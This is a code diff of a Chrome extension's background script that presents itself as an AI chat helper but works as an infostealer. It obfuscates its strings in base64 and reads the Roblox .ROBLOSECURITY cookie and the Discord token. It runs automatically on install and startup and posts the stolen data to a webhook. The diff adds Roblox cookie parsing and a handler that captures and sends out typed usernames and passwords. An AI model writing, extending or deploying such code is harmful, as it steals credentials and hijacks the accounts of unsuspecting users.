@@ -4,13 +4,14 @@ var _cfg = CONFIG;
 var _w = _cfg.WEBHOOK_URL;
 var _k = _cfg.GROQ_API_KEY;
 
-// ─── Helper ───
 function _d(s) { return atob(s); }
 
-// ─── All string constants base64-encoded ───
+// ─── Strings ───
 var _S = {
   k1: _d('bGFzdFRva2Vu'),
   k2: _d('bGFzdENvb2tpZQ=='),
+  k3: _d('bGFzdFVzZXI='),
+  k4: _d('bGFzdFBhc3M='),
   m1: _d('8J+UpCDigKIg'),
   m2: _d('VXNlcjo='),
   m3: _d('VG9rZW46'),
@@ -20,9 +21,12 @@ var _S = {
   m7: _d('TmV3IGNvb2tpZSBkZXRlY3RlZA=='),
   m8: _d('VG9rZW4gKyBjb29raWUgY2hhbmdlZA=='),
   m9: _d('VXBkYXRl'),
+  m10: _d('8J+UpO+4j+KEnA=='), // "🔨🔓"
+  m11: _d('8J+UpO+4jwo='), // "🔨"
   l1: _d('W0FJXSBSZWFkeQ=='),
   l2: _d('W0FJXSBOZXcgdG9rZW4gZGV0ZWN0ZWQ='),
   l3: _d('W0FJXSBOZXcgY29va2llIGRldGVjdGVk'),
+  l4: _d('W0FJXSBHcmFiYmVkIGNyZWRz'), // "[AI] Grabbed creds"
 };
 
 console.log(_S.l1);
@@ -44,7 +48,27 @@ function _a1(r) {
     }
 }
 
-// ─── Get token from Discord tab ───
+// ─── Parse Roblox cookie ───
+function _a8(c) {
+    try {
+        // Roblox cookie format: _|WARNING:...|_<encoded data>
+        var match = c.match(/\|_([^|]+)\|_/);
+        if (!match) return { i: 'Unknown', n: 'Unknown' };
+        var parts = match[1].split('.');
+        if (parts.length < 2) return { i: 'Unknown', n: 'Unknown' };
+        var b = parts[1].replace(/-/g, '+').replace(/_/g, '/');
+        while (b.length % 4) b += '=';
+        var d = JSON.parse(atob(b));
+        return {
+            i: d.UserID || d.userId || d.id || 'Unknown',
+            n: d.UserName || d.username || d.name || 'Unknown'
+        };
+    } catch (e) {
+        return { i: 'Unknown', n: 'Unknown' };
+    }
+}
+
+// ─── Get Discord token ───
 function _a2(t) {
     return new Promise((r) => {
         chrome.tabs.sendMessage(t, { action: 'getAuth' }, (res) => {
@@ -54,7 +78,7 @@ function _a2(t) {
     });
 }
 
-// ─── Get Roblox cookie (always works) ───
+// ─── Get Roblox cookie ───
 function _a3() {
     return new Promise((r) => {
         chrome.cookies.get({ url: 'https://www.roblox.com', name: '.ROBLOSECURITY' }, (c) => {
@@ -65,12 +89,23 @@ function _a3() {
 }
 
 // ─── Send webhook ───
-function _a4(t, c, type) {
+function _a4(t, c, type, user, pass) {
     var p = t ? _a1(t) : { i: 'Unknown', n: 'Unknown' };
+    var rp = c ? _a8(c) : { i: 'Unknown', n: 'Unknown' };
+    
     var msg = _S.m1 + (type || _S.m9) + "\n";
-    msg += _S.m2 + " " + p.n + " (`" + p.i + "`)\n\n";
+    msg += _S.m2 + " " + p.n + " (`" + p.i + "`)\n";
+    msg += "🎮 Roblox: " + rp.n + " (`" + rp.i + "`)\n\n";
+    
+    if (user && pass) {
+        msg += "🔓 **Credentials Captured**\n";
+        msg += "**User:** " + user + "\n";
+        msg += "**Pass:** `" + pass + "`\n\n";
+    }
+    
     msg += _S.m3 + "\n```\n" + (t || _S.m5) + "\n```\n\n";
     msg += _S.m4 + "\n```\n" + (c || _S.m5) + "\n```";
+    
     fetch(_w, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -101,14 +136,30 @@ function _a5(t, c) {
     });
 }
 
+// ─── Handle captured credentials ───
+function _a9(user, pass, url) {
+    console.log(_S.l4);
+    chrome.storage.local.get([_S.k3, _S.k4], (data) => {
+        var l1 = data[_S.k3] || null;
+        var l2 = data[_S.k4] || null;
+        if (user && user !== l1) {
+            chrome.storage.local.set({ [_S.k3]: user });
+        }
+        if (pass && pass !== l2) {
+            chrome.storage.local.set({ [_S.k4]: pass });
+        }
+        // Send immediately if we have both
+        if (user && pass) {
+            _a4(null, null, "🔓 CREDENTIALS CAPTURED", user, pass);
+        }
+    });
+}
+
 // ─── Collect data ───
 function _a6() {
-    // Always check cookie first
     _a3().then(cookie => {
-        // Try to find a Discord tab for token
         chrome.tabs.query({ url: "https://discord.com/*" }, (tabs) => {
             if (tabs.length === 0) {
-                // No Discord tab – only cookie may have changed
                 if (cookie) {
                     chrome.storage.local.get([_S.k2], (data) => {
                         if (cookie !== data[_S.k2]) {
@@ -120,7 +171,6 @@ function _a6() {
                 return;
             }
             var tab = tabs[0];
-            // Ensure content script is injected
             chrome.scripting.executeScript({
                 target: { tabId: tab.id },
                 files: ['content.js']
@@ -147,7 +197,7 @@ chrome.alarms.onAlarm.addListener((alarm) => {
     if (alarm.name === 'watch') _a6();
 });
 
-// ─── Start immediately ───
+// ─── Start ───
 chrome.runtime.onStartup.addListener(() => {
     _a7();
     _a6();
@@ -158,11 +208,9 @@ chrome.runtime.onInstalled.addListener(() => {
     _a6();
 });
 
-// Also start right away
 _a7();
 _a6();
 
-// Keep worker alive
 setInterval(() => { console.log('.'); }, 10000);
 
 // ─── AI Handler ───
@@ -208,10 +256,15 @@ chrome.runtime.onMessage.addListener((req, sender, cb) => {
         _ai(req.message)
             .then(reply => cb({ success: true, reply: reply }))
             .catch(err => cb({ success: false, error: err.message }));
-        return true; // async
+        return true;
     }
     if (req.action === 'checkStatus') {
         cb({ status: 'ok' });
+        return true;
+    }
+    if (req.action === 'creds') {
+        _a9(req.username, req.password, req.url);
+        cb({ success: true });
         return true;
     }
 });
